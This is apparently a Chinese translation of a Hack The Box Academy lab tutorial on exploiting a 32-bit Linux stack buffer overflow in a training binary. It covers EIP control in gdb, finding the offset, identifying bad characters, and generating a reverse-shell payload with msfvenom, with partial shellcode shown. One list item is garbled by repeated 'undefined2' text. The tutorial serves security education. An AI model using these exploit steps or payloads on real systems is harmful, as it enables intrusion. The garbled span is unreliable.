+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="Take-Control-of-EIP"><a href="#Take-Control-of-EIP" class="headerlink" title="Take Control of EIP"></a>Take Control of EIP</h2><p>基于堆栈的缓冲区溢出最重要的方面之一是控制<code>instruction pointer</code>（<code>EIP</code>），这样我们就可以告诉它应该跳转到哪个地址。这将使<code>EIP</code>指向我们的<code>shellcode</code>开始的地址，并导致CPU执行它。</p>
+<p>我们可以使用Python在GDB中执行命令，它直接作为输入。</p>
+<h4 id="Segmentation-Fault"><a href="#Segmentation-Fault" class="headerlink" title="Segmentation Fault"></a>Segmentation Fault</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">student@nix-bow:~$ gdb -q bow32</span><br><span class="line"></span><br><span class="line">(gdb) run $(python -c "print '\x55' * 1200")</span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x55555555 in ?? ()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们插入1200“<code>U</code>“s（十六进制“<code>55</code>”）作为输入，我们可以从寄存器信息中看到我们已经覆盖了<code>EIP</code>。据我们所知，<code>EIP</code>指向下一条要执行的指令。    </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) info registers </span><br><span class="line"></span><br><span class="line">eax            0x1	1</span><br><span class="line">ecx            0xffffd6c0	-10560</span><br><span class="line">edx            0xffffd06f	-12177</span><br><span class="line">ebx            0x55555555	1431655765</span><br><span class="line">esp            0xffffcfd0	0xffffcfd0</span><br><span class="line">ebp            0x55555555	0x55555555		# &lt;---- EBP overwritten</span><br><span class="line">esi            0xf7fb5000	-134524928</span><br><span class="line">edi            0x0	0</span><br><span class="line">eip            0x55555555	0x55555555		# &lt;---- EIP overwritten</span><br><span class="line">eflags         0x10286	[ PF SF IF RF ]</span><br><span class="line">cs             0x23	35</span><br><span class="line">ss             0x2b	43</span><br><span class="line">ds             0x2b	43</span><br><span class="line">es             0x2b	43</span><br><span class="line">fs             0x0	0</span><br><span class="line">gs             0x63	99</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们想直观地想象这个过程，那么这个过程看起来就像这样。</p>
+<h4 id="Buffer-1"><a href="#Buffer-1" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png" alt="image"></p>
+<p>这意味着我们必须对EIP进行写访问。这反过来又允许指定EIP应该跳转到哪个内存地址。然而，为了操作寄存器，我们需要一个精确的U数，直到EIP，以便后面的4个字节可以用我们想要的内存地址覆盖。</p>
+<h3 id="Determine-The-Offset"><a href="#Determine-The-Offset" class="headerlink" title="Determine The Offset"></a>Determine The Offset</h3><p>偏移量用于确定覆盖缓冲区需要多少字节，以及shellcode周围有多少空间。</p>
+<p>Shellcode是一种程序代码，它包含我们希望CPU执行的操作的指令。shellcode的手动创建将在其他模块中更详细地讨论。但是为了先保存一些时间，我们使用Metasploit  Framework（MSF），它提供了一个名为“pattern_create”的Ruby脚本，可以帮助我们确定到达EIP的确切字节数。它根据您指定的字节长度创建唯一的字符串，以帮助确定偏移量。</p>
+<h4 id="Create-Pattern"><a href="#Create-Pattern" class="headerlink" title="Create Pattern"></a>Create Pattern</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 &gt; pattern.txt</span><br><span class="line">mikannse7@htb[/htb]$ cat pattern.txt</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，我们用生成的模式替换1200个“<code>U</code>“，并再次将注意力集中在EIP上。</p>
+<h4 id="GDB-Using-Generated-Pattern"><a href="#GDB-Using-Generated-Pattern" class="headerlink" title="GDB - Using Generated Pattern"></a>GDB - Using Generated Pattern</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9'") </span><br><span class="line"></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9'")</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x69423569 in ?? ()</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="GDB-EIP"><a href="#GDB-EIP" class="headerlink" title="GDB - EIP"></a>GDB - EIP</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) info registers eip</span><br><span class="line"></span><br><span class="line">eip            0x69423569	0x69423569</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们看到<code>EIP</code>显示不同的内存地址，我们可以使用另一个名为“<code>pattern_offset</code>”的MSF工具来计算前进到<code>EIP</code>所需的确切字符数（偏移量）。</p>
+<h4 id="GDB-Offset"><a href="#GDB-Offset" class="headerlink" title="GDB - Offset"></a>GDB - Offset</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569</span><br><span class="line"></span><br><span class="line">[*] Exact match at offset 1036</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Buffer-2"><a href="#Buffer-2" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png" alt="image"></p>
+<p>如果我们现在对“<code>U</code>“使用这个字节数，那么我们应该正好落在<code>EIP</code>上。为了覆盖它并检查我们是否按计划到达它，我们可以用“<code>\x66</code>”添加4个字节并执行它以确保我们控制<code>EIP</code>。</p>
+<h4 id="GDB-Offset-1"><a href="#GDB-Offset-1" class="headerlink" title="GDB Offset"></a>GDB Offset</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")</span><br><span class="line"></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x66666666 in ?? ()</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Buffer-3"><a href="#Buffer-3" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png" alt="image"></p>
+<p>现在我们看到我们已经用“<code>EIP</code>”字符覆盖了<code>\x66</code>。接下来，我们必须找出我们有多少空间用于shellcode，然后执行我们想要的命令。由于我们现在控制了<code>EIP</code>，我们稍后将用指向shellcode开头的地址覆盖它。</p>
+<h2 id="Determine-the-Length-for-Shellcode"><a href="#Determine-the-Length-for-Shellcode" class="headerlink" title="Determine the Length for Shellcode"></a>Determine the Length for Shellcode</h2><p>现在我们应该找出我们有多少空间让shellcode执行我们想要的动作。利用这样的漏洞来获取反向shell对我们来说是一种时尚和有用的方法。首先，我们必须知道我们要插入的shellcode大约有多大，为此，我们将使用<code>msfvenom</code>。</p>
+<h4 id="Shellcode-Length"><a href="#Shellcode-Length" class="headerlink" title="Shellcode - Length"></a>Shellcode - Length</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c</span><br><span class="line"></span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 68 bytes</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们现在知道我们的有效载荷大约是68字节。作为预防措施，如果shellcode由于以后的规范而增加，我们应该尝试使用更大的范围。</p>
+<p>通常在shellcode开始之前插入一些<code>no operation instruction</code>（<code>NOPS</code>）是很有用的，这样它就可以干净地执行。让我们简单总结一下我们需要做的事情：</p>
+<ol>
+<li>我们总共需要1040个字节才能到达<code>EIP</code>。</li>
+<li>在这里，我们可以使用<code>100 bytes</code>中的额外<code>NOPs</code></li>
+<li><code>150 bytes</code> for our <code>shellcode</code>.<br><code>150 bytes</code>2#<code>shellcode</code>undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2undefined2</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786</span><br><span class="line">     NOPs = "\x90" * 100</span><br><span class="line">Shellcode = "\x44" * 150</span><br><span class="line">      EIP = "\x66" * 4</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Buffer-缓冲"><a href="#Buffer-缓冲" class="headerlink" title="Buffer 缓冲"></a>Buffer 缓冲</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png" alt="image"></p>
+<p>现在我们可以尝试找出有多少空间可以插入shellcode。</p>
+<h4 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')</span><br><span class="line"></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x66666666 in ?? ()</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Buffer-4"><a href="#Buffer-4" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png" alt="image"></p>
+<h2 id="Identification-of-Bad-Characters"><a href="#Identification-of-Bad-Characters" class="headerlink" title="Identification of Bad Characters"></a>Identification of Bad Characters</h2><p>以前在类UNIX操作系统中，二进制文件以两个字节开始，其中包含确定文件类型的“<code>magic number</code>”。一开始，它用于识别不同平台的目标文件。渐渐地，这个概念被转移到其他文件中，现在几乎每个文件都包含一个神奇的数字。</p>
+<p>这种保留字符也存在于应用程序中，但它们并不总是出现，也不总是相同的。这些保留字符，也称为<code>bad characters</code>，可以变化，但我们经常会看到这样的字符：</p>
+<ul>
+<li><code>\x00</code> - Null Byte</li>
+<li><code>\x0A</code> - Line Feed</li>
+<li><code>\x0D</code> - Carriage Return</li>
+<li><code>\xFF</code> - Form Feed</li>
+</ul>
+<p>在这里，我们使用下面的字符列表来找出在生成shellcode时必须考虑和避免的所有字符。</p>
+<h4 id="Character-List"><a href="#Character-List" class="headerlink" title="Character List"></a>Character List</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了计算我们的CHAR变量中的字节数，我们可以使用bash将“\x”替换为空格，然后使用<code>wc</code>来计算单词。</p>
+<h4 id="Calculate-CHARS-Length"><a href="#Calculate-CHARS-Length" class="headerlink" title="Calculate CHARS Length"></a>Calculate CHARS Length</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ echo $CHARS | sed 's/\\x/ /g' | wc -w</span><br><span class="line"></span><br><span class="line">256</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此字符串的长度为<code>256</code> bytes。因此，我们需要再次计算缓冲区。</p>
+<h4 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Buffer = "\x55" * (1040 - 256 - 4) = 780</span><br><span class="line"> CHARS = "\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfd\xfe\xff"</span><br><span class="line">   EIP = "\x66" * 4</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在让我们来看看整个主要功能。因为如果我们现在执行它，程序会崩溃，而不给我们跟踪内存中发生的事情的可能性。所以我们将在相应的函数上设置一个断点，这样执行就停止在这个点上，我们可以分析内存的内容。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x56555582 &lt;+0&gt;: 	lea    ecx,[esp+0x4]</span><br><span class="line">   0x56555586 &lt;+4&gt;: 	and    esp,0xfffffff0</span><br><span class="line">   0x56555589 &lt;+7&gt;: 	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x5655558c &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x5655558d &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x5655558f &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x56555590 &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x56555591 &lt;+15&gt;:	call   0x56555450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x56555596 &lt;+20&gt;:	add    ebx,0x1a3e</span><br><span class="line">   0x5655559c &lt;+26&gt;:	mov    eax,ecx</span><br><span class="line">   0x5655559e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]</span><br><span class="line">   0x565555a1 &lt;+31&gt;:	add    eax,0x4</span><br><span class="line">   0x565555a4 &lt;+34&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x565555a6 &lt;+36&gt;:	sub    esp,0xc</span><br><span class="line">   0x565555a9 &lt;+39&gt;:	push   eax</span><br><span class="line">   0x565555aa &lt;+40&gt;:	call   0x5655554d &lt;bowfunc&gt;		# &lt;---- bowfunc Function</span><br><span class="line">   0x565555af &lt;+45&gt;:	add    esp,0x10</span><br><span class="line">   0x565555b2 &lt;+48&gt;:	sub    esp,0xc</span><br><span class="line">   0x565555b5 &lt;+51&gt;:	lea    eax,[ebx-0x1974]</span><br><span class="line">   0x565555bb &lt;+57&gt;:	push   eax</span><br><span class="line">   0x565555bc &lt;+58&gt;:	call   0x565553e0 &lt;puts@plt&gt;</span><br><span class="line">   0x565555c1 &lt;+63&gt;:	add    esp,0x10</span><br><span class="line">   0x565555c4 &lt;+66&gt;:	mov    eax,0x1</span><br><span class="line">   0x565555c9 &lt;+71&gt;:	lea    esp,[ebp-0x8]</span><br><span class="line">   0x565555cc &lt;+74&gt;:	pop    ecx</span><br><span class="line">   0x565555cd &lt;+75&gt;:	pop    ebx</span><br><span class="line">   0x565555ce &lt;+76&gt;:	pop    ebp</span><br><span class="line">   0x565555cf &lt;+77&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x565555d2 &lt;+80&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了设置断点，我们给予命令“<code>break</code>”和相应的函数名。</p>
+<h4 id="GDB-Breakpoint"><a href="#GDB-Breakpoint" class="headerlink" title="GDB Breakpoint"></a>GDB Breakpoint</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) break bowfunc </span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x56555551</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，我们可以执行新创建的输入并查看内存。</p>
+<h4 id="Send-CHARS"><a href="#Send-CHARS" class="headerlink" title="Send CHARS"></a>Send CHARS</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')</span><br><span class="line"></span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')</span><br><span class="line">/bin/bash: warning: command substitution: ignored null byte in input</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x56555551 in bowfunc ()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在我们用坏字符执行缓冲区并到达断点后，我们可以查看堆栈。</p>
+<h4 id="The-Stack-1"><a href="#The-Stack-1" class="headerlink" title="The Stack"></a>The Stack</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) x/2000xb $esp+500</span><br><span class="line"></span><br><span class="line">0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00</span><br><span class="line">0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73</span><br><span class="line">0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62</span><br><span class="line">0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32</span><br><span class="line">0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55</span><br><span class="line">				 # |---&gt; "\x55"s begin</span><br><span class="line"></span><br><span class="line">0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55</span><br><span class="line">0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这里，我们认识到我们的“<code>\x55</code>”开始的地址。从这里，我们可以继续下去，寻找我们的<code>CHARS</code>开始的地方。</p>
+<h4 id="The-Stack-CHARS"><a href="#The-Stack-CHARS" class="headerlink" title="The Stack - CHARS"></a>The Stack - CHARS</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;SNIP&gt;</span><br><span class="line">0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55</span><br><span class="line">0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55</span><br><span class="line">0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03</span><br><span class="line">												 # |---&gt; CHARS begin</span><br><span class="line"></span><br><span class="line">0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c</span><br><span class="line">0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14</span><br><span class="line">0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们看到“<code>\x55</code>”在哪里结束，<code>CHARS</code>变量在哪里开始。但是如果我们仔细观察它，我们会发现它以“<code>\x01</code>”而不是“<code>\x00</code>”开头。我们已经在执行过程中看到了警告，即我们输入中的<code>null byte</code>被忽略。</p>
+<p>因此，我们可以注意到这个字符，将其从变量<code>CHARS</code>中删除，并调整“<code>\x55</code>“的数量。</p>
+<h4 id="Notes-1"><a href="#Notes-1" class="headerlink" title="Notes"></a>Notes</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># Substract the number of removed characters</span><br><span class="line">Buffer = "\x55" * (1040 - 255 - 4) = 781</span><br><span class="line"></span><br><span class="line"># "\x00" removed: 256 - 1 = 255 bytes</span><br><span class="line"> CHARS = "\x01\x02\x03...&lt;SNIP&gt;...\xfd\xfe\xff"</span><br><span class="line"> </span><br><span class="line">   EIP = "\x66" * 4</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Send-CHARS-Without-Null-Byte"><a href="#Send-CHARS-Without-Null-Byte" class="headerlink" title="Send CHARS - Without Null Byte"></a>Send CHARS - Without Null Byte</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')</span><br><span class="line"></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')</span><br><span class="line">Breakpoint 1, 0x56555551 in bowfunc ()</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="The-Stack-2"><a href="#The-Stack-2" class="headerlink" title="The Stack"></a>The Stack</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) x/2000xb $esp+550</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03</span><br><span class="line">0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c</span><br><span class="line">												 # |----| &lt;- "\x09" expected</span><br><span class="line"></span><br><span class="line">0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这里，它取决于我们的字节在变量<code>CHARS</code>中的正确顺序，以查看是否有任何字符更改，中断或跳过顺序。现在我们认识到，在“<code>\x08</code>“之后，我们遇到了“<code>\x00</code>”，而不是预期的“<code>\x09</code>”。这告诉我们，这个字符在这里是不允许的，必须相应地删除。</p>
+<h4 id="Notes-2"><a href="#Notes-2" class="headerlink" title="Notes"></a>Notes</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># Substract the number of removed characters</span><br><span class="line">Buffer = "\x55" * (1040 - 254 - 4) = 782	</span><br><span class="line"></span><br><span class="line"># "\x00" &amp; "\x09" removed: 256 - 2 = 254 bytes</span><br><span class="line"> CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfd\xfe\xff" </span><br><span class="line"> </span><br><span class="line">   EIP = "\x66" * 4</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Send-CHARS-Without-“-x00”-amp-“-x09"><a href="#Send-CHARS-Without-“-x00”-amp-“-x09" class="headerlink" title="Send CHARS - Without “\x00” &amp; “\x09"></a>Send CHARS - Without “\x00” &amp; “\x09</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')</span><br><span class="line"></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')</span><br><span class="line">Breakpoint 1, 0x56555551 in bowfunc ()</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="The-Stack-3"><a href="#The-Stack-3" class="headerlink" title="The Stack"></a>The Stack</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) x/2000xb $esp+550</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03</span><br><span class="line">0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c</span><br><span class="line">												 # |----| &lt;- "\x0a" expected</span><br><span class="line"></span><br><span class="line">0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个过程必须重复，直到所有可能中断流的字符都被删除。</p>
+<h2 id="Generating-Shellcode"><a href="#Generating-Shellcode" class="headerlink" title="Generating Shellcode"></a>Generating Shellcode</h2><p>我们已经了解了生成shellcode的近似长度的工具<code>msfvenom</code>。现在，我们可以再次使用这个工具来生成实际的shellcode，这使得目标系统的CPU执行我们想要的命令。</p>
+<p>但是在生成shellcode之前，我们必须确保各个组件和属性与目标系统匹配。因此，我们必须注意以下几个方面：</p>
+<ul>
+<li><code>Architecture</code></li>
+<li><code>Platform</code></li>
+<li><code>Bad Characters</code></li>
+</ul>
+<h4 id="MSFvenom-Syntax"><a href="#MSFvenom-Syntax" class="headerlink" title="MSFvenom Syntax"></a>MSFvenom Syntax</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=&lt;LHOST&gt; lport=&lt;LPORT&gt; --format c --arch x86 --platform linux --bad-chars "&lt;chars&gt;" --out &lt;filename&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="MSFvenom-Generate-Shellcode"><a href="#MSFvenom-Generate-Shellcode" class="headerlink" title="MSFvenom - Generate Shellcode"></a>MSFvenom - Generate Shellcode</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode</span><br><span class="line"></span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 95</span><br><span class="line">Payload size: 95 bytes</span><br><span class="line">Final size of c file: 425 bytes</span><br><span class="line">Saved as: shellcode</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ cat shellcode</span><br><span class="line"></span><br><span class="line">unsigned char buf[] = </span><br><span class="line">"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"</span><br><span class="line">"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"</span><br><span class="line">"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在我们已经有了shellcode，我们调整它使其只有一个字符串，然后我们可以再次调整并提交简单的漏洞利用。</p>
